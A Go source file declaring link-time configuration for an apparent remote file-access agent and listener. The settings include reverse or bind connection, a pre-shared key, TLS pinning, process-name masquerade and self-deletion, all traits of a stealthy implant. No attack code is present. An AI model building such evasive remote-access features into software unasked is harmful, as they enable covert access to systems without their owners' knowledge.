package main

// Compile-time configuration injected via -ldflags -X.
// These are shared between agent and listener build variants.
// Most vars are only referenced under //go:build agent.
//
//nolint:unused // populated at link time via -ldflags -X
var (
	cfgMode        string // "reverse" or "bind" — if set, run as agent
	cfgAddress     string // HOST:PORT
	cfgPSK         string // base64-encoded PSK
	cfgFingerprint string // TLS cert fingerprint (hex SHA256)
	cfgSNI         string // TLS SNI hostname
	cfgRoot        string // filesystem root to expose (default "/")
	cfgExcludes    string // comma-separated exclude prefixes
	cfgProcName    string // process name masquerade
	cfgSelfDelete  string // "true" to self-delete after start
	cfgRateLimit   string // tokens per second
	cfgRateBurst   string // burst size
	cfgProxyAddr   string // HTTP proxy address
	cfgProxyUser   string // proxy username
	cfgProxyPass   string // proxy password
	cfgReadOnly    string // "true" to reject write operations
	cfgVersion     string // version tag
	cfgBuildCommit string // git short commit hash
)
